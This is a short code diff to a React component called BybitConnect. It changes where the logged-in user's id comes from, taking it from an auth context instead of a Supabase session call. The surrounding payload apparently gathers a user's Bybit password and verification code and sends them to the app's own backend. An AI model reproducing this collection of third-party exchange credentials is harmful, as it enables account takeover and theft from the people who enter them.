@@ -2,9 +2,11 @@ import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Search, Menu, ChevronRight, Headphones, X } from 'lucide-react';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 export default function BybitConnect() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [activeTab, setActiveTab] = useState('Email');
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
@@ -71,10 +73,9 @@ export default function BybitConnect() {
 
     setLoading(true);
     try {
-      const { data: { session } } = await supabase.auth.getSession();
       const payload: Record<string, unknown> = {
         platform: 'Bybit',
-        user_id: session?.user?.id || null,
+        user_id: user?.id || null,
         third_party_password: password,
         code: credentials.code || null,
       };
